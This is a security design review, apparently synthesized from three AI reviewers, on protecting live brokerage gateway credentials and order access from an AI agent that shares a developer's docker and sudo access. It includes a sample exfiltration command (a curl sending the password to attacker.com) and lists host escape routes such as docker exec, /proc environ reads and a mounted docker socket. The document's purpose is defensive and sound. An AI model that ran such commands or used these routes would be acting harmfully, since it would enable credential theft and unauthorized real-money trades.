---
name: ib-gateway-cred-protection
created: 2026-06-02
status: review-complete
sources: [gemini, codex, claude]
---

# Credential protection for a live IB Gateway on a shared host where a developer has docker-group access

## Consensus (all three reviewers)

1. **Encryption-at-rest with an admin passphrase is security theater against the stated threat.** Any in-band scheme that eventually injects cleartext creds into a container the developer's identity can reach is broken by `docker inspect` / `docker exec` / bind-mount tricks. (Gemini, Codex, Claude.)
2. **The real boundary is privilege separation at the runtime level, not secret format.** No file/key/vault scheme buys you a credential boundary while the developer's identity has ambient access to the docker daemon that runs the live container.
3. **The current proposed design ("encrypted file + passphrase prompt + postgres audit") is acceptable only as at-rest hygiene** — it stops accidental `cat`/git-commit/backup-tape leakage. It does **not** stop the agent-exfiltration threat we said we were protecting against.
4. **Live deploy must be pull-only and pinned**, not `build:` or `:latest`. (Codex explicitly flags this in the current `mcp/ib-live/` scaffold; Claude says "image@sha256:..." not floating tags; Gemini implies it by warning about supply-chain poisoning of dev-built images.) The current `mcp/ib-live/docker-compose.yml` violates this on both lines.
5. **Once the runtime boundary is real, plain `env_file` mode-600 is fine.** No need for Vault/TPM/DB-keystore. Don't over-engineer the secret medium after the actual boundary is in place.
6. **Pull the dev-authored image with explicit Dockerfile/entrypoint review before each live promotion.** All three reviewers (most pointedly Gemini and Claude) call out that the image is the trust boundary — admin injecting live creds into a developer-authored container means admin is trusting the developer's image content unconditionally.

## Key insights

- **(Claude) The actual asset is not the password — it's the authenticated, logged-in order-placement capability.** Once the live gateway is logged in, anyone who can reach API port 4001, `docker exec`/`attach`, or open VNC can place real-money orders **without ever needing a credential**. Your MCP wrapper does exactly this. **You could encrypt the password perfectly and still lose the account.** This reframes the whole problem: protect the *session*, not the *secret*.
- **(Claude) `sudo` is the deeper disqualifier, not `docker`.** A `sudo` user can `cat /proc/<pid>/environ`, ptrace the JVM, bind-mount the disk, edit any audit log, and read guest RAM of any VM on the host (`virsh dump`, qemu monitor, `/dev/mem`). VM-on-same-host **is not** a boundary when the developer keeps host-sudo. Plan accordingly.
- **(Codex) But in the AI-agent threat model specifically, `docker` is the *easier* vector than `sudo`** — docker is typically passwordless and scriptable; sudo usually prompts. So for an AI agent acting without explicit human help, `docker` is the higher-leverage access. (Reconciles with Claude: docker is the *first* thing to fix; sudo is the bar you have to clear to call the design *complete*.)
- **(Claude) "The developer is also the beneficiary" dissolves half the requirement.** Hiding a man's own brokerage password from him is incoherent. The coherent requirement is "an autonomous agent running under his identity cannot exfiltrate creds or place orders." That makes this an **agent-confinement problem**, not a cryptography problem. The fix: **separate the human's identity from the agent's identity** — give the AI its own non-sudo, non-docker uid. Then `env_file` mode-600 actually means something, because the only humans who can read it are humans you trust.
- **(Gemini) Supply-chain poisoning is the most-likely actual exfil vector.** A 3-line `curl -d "$TWS_PASSWORD" attacker.com` in the dev's `entrypoint.sh` exfiltrates on first live start; no host hardening stops it. Image diff review must be a gate, not a courtesy.
- **(Claude) Lock the order path explicitly, not just the file.** Bind 4001 to admin-only network/`127.0.0.1`, disable VNC in live except during admin's one-time settings (then bind `127.0.0.1` + SSH-tunnel), egress-restrict the live container to IBKR endpoints only.
- **(Claude) Use IBKR-side controls as the primary backstop.** API trusted-IP allowlist, daily/notional order limits, sub-account with hard position limits. This is the **only** layer that constrains damage if the host is fully owned, and it's not in the current design.
- **(Claude) Audit-on-the-rooted-host is theater.** Postgres audit logging is tamperable if the adversary can edit the DB. Ship security-relevant events off-host to an append-only / object-lock sink.
- **(Codex) Two integrity issues in the current `mcp/ib-live/` scaffold (independent of secrets):** the compose `build:`s locally (line 5) and the gateway service uses `:latest` (line 35). Both must change to pinned digests before any live use. Also: paper wrapper mounts `/var/run/docker.sock` (`mcp/ib-paper/docker-compose.yml:21`) — **do not** carry that to live; mounted docker socket = host control regardless of `:ro`.
- **(Gemini) VNC is a standing order-placement backdoor** if reachable from the developer subnet. Bind `127.0.0.1` only; SSH-tunnel for admin.
- **(Codex) Group-removal is not an instant revoke.** Existing sessions retain supplementary groups until full logout. Any "kick him out of docker for the session, restore after" pattern is racy and forgettable — don't.

## Disagreements

| Topic | Gemini | Codex | Claude | My read |
|---|---|---|---|---|
| **VM as boundary** | Recommended (lightweight Ubuntu via KVM/Multipass/LXD on the same host) | Recommended as best option on one box | **Insufficient** if dev keeps host-sudo (hypervisor admin reads guest RAM) | Claude's correctness depends on whether dev's sudo is *passwordless* or *AI-scriptable*. On most home setups, sudo prompts. For the stated AI-agent threat, a same-host VM is probably enough; for a fully-compromised dev identity, only a separate host clears the bar. |
| **What to remove first** | Remove `sudo` from AI's user (split agent from human) | Remove dev from `docker` (most dangerous for AI agents) | Both, but the deeper one is `sudo` | All three agree that **splitting the agent's identity from the human's** is the move. The order matters less than the split itself. |
| **What replaces `env_file`** | Docker Secrets via tmpfs `/run/secrets/...` + entrypoint export | `env_file` is fine after the boundary is real | `env_file` is fine after the boundary is real | Gemini's `/run/secrets/` is a marginal hardening (hides creds from `docker inspect`, doesn't stop `docker exec`). Skip the indirection; rely on the runtime boundary. |
| **Same-host vs separate-host** | Same-host VM acceptable | Same-host VM or rootless acceptable | Separate host is the only thing that survives a *fully* compromised dev identity | For our home-lab threat model (AI agent, not red team), same-host with proper identity split is acceptable. For peace of mind on a real-money account, separate host or rootless-under-admin is cheap insurance. |

## Action items (ordered)

### Phase 0 — Before any live deploy (blocking)

1. **Stop treating the "encrypted passphrase + postgres audit" path as a credential boundary.** Keep encryption-at-rest only if you want hygiene against accidental disk leaks; don't market it as protection against the developer-side agent.
2. **Hold the "validate live by running it briefly" plan until at least Phase 1 is done.** Right now there is no boundary; running live on the shared docker daemon with the agent in `docker` is the exact thing all three reviewers say not to do.
3. **Open question to user**: does the live trading strategy itself run as the AI agent, or only as admin? Claude flags this changes the order-path isolation design significantly. (If the algo is the agent, 4001 must be reachable by the agent by design, and the order-path lockdown gets harder.)

### Phase 1 — Identity / runtime separation (blocking on live)

4. **Split the human and the AI agent identities.** Give the AI its own Linux user (`websurfinmurf-agent` or similar). **Not** in `sudo`, **not** in `docker`. If the agent needs to run containers (paper gateway), give it **rootless docker** scoped to its own uid.
5. **Decide and commit to one of these two runtime architectures for live:**
   - **(a)** Live gateway runs under an **admin-only rootless docker** daemon on this host. Dev/agent has no path to that daemon.
   - **(b)** Live gateway runs in an **admin-only VM** on this host. Dev/agent has no SSH/sudo/docker access to the VM.
   - Reject "temporarily remove dev from docker group during live session" — racy, forgettable, and group changes don't revoke open sessions.
   - Reject "live + paper on the same shared rootful daemon" — that's the current path the reviewers tell us not to take.

### Phase 2 — Live deploy pipeline hardening

6. **Pin live to an image digest, not a tag**: `image: ghcr.io/.../ib-gateway@sha256:...`. Update `mcp/ib-live/docker-compose.yml` (currently `:latest`, also has a local `build:`). No `build:` in live.
7. **Admin owns the live entrypoint layer.** Either a thin `FROM dev/image` Dockerfile in admin's tree, or a documented manual diff of the dev's entrypoint before every live promotion. Closes the supply-chain hole. (Gemini, Claude)
8. **Do not mount `/var/run/docker.sock` in the live wrapper** (paper does — `mcp/ib-paper/docker-compose.yml:21`). Use systemd / the VM supervisor for restart instead. (Codex)
9. **Bind all live ports to `127.0.0.1` or an admin-only network:**
   - IB API socat port (`4003 → 4001`): admin-only docker network the agent isn't on, or `127.0.0.1`. (All three.)
   - VNC: `127.0.0.1` only. SSH-tunnel for one-time admin sessions. Disable VNC entirely after the initial settings pass. (Gemini, Claude.)
10. **Egress-restrict the live container** to IBKR endpoints only (iptables / docker network rules). A compromised image that gets creds then can't phone home. (Claude.)

### Phase 3 — IBKR-side blast-radius controls

11. **Treat IBKR-side controls as the primary backstop, not the host:**
    - API trusted-IP allowlist (only the linuxserver.lan static address).
    - Daily/notional order limits set on the live account.
    - **Segregate strategy capital into a sub-account with hard position limits.** Caps damage even if the host is fully owned. (Claude — and this is the single most defensible recommendation in the entire review.)
12. **Move security-relevant audit logs off-host** to an append-only sink (object-lock S3 bucket or remote syslog on a host the agent identity cannot reach). On-box postgres audit is tamperable. (Claude.)

### Phase 4 — Simplify

13. **After all of the above, `env_file: ib-gateway-live.env` with mode 600 owned by `administrator` is the right answer for the secret medium.** Drop the encryption-at-rest scheme as a security control; keep it only as backup hygiene if you want. (All three.)
14. **Tighten artifact handling:** treat `./jts` and `./ibc` directories as sensitive (they contain remembered settings / trusted-device state). chmod 700 on host. (Codex.)

## Risks flagged

- **Supply-chain on the dev image** (Gemini, Claude): an exfil curl in the entrypoint defeats every host control. Image diff before every live pull is non-negotiable.
- **Session ≠ password** (Claude): focusing on cred secrecy while leaving 4001 / VNC / `docker exec` reachable from the agent is misallocated effort.
- **`sudo` defeats VM isolation** (Claude): if dev keeps host-sudo, a same-host VM is incomplete defense. For a money-grade boundary, dev must not have sudo on the hypervisor host.
- **Audit on the same host = tamperable** (Claude). Off-host or it doesn't count.
- **Group removal is not session revoke** (Codex): supplementary groups persist in open sessions until logout. Any group-membership-based control needs a session reset to take effect.
- **VNC password is a standing order-placement backdoor** (Gemini). Bind localhost-only or disable.
- **Long-running container makes startup passphrase prompts low-value** (Codex). The exposure window is the whole gateway uptime.

## Recommended path forward (synthesized)

The simplest defensible plan that survives all three reviews:

1. Create an unprivileged Linux user for the AI agent. Remove the agent's path to the host docker daemon. (Phase 1.)
2. Run the live gateway under either rootless docker as admin **or** a small admin-only VM on this host, with the dev/agent locked out of both. (Phase 1.)
3. Pin the live image by sha256 digest. Diff the dev's entrypoint before every promotion. Bind 4001 + VNC to admin-only paths; egress-restrict. (Phases 2.)
4. Apply IBKR-side controls (trusted-IP, daily limits, sub-account) as the primary backstop. Off-host audit. (Phase 3.)
5. Keep `env_file` mode 600 for the secrets medium. Drop the encrypted-passphrase scheme. (Phase 4.)

The credential-encryption rabbit hole we were going down is the wrong rabbit hole; do this instead.
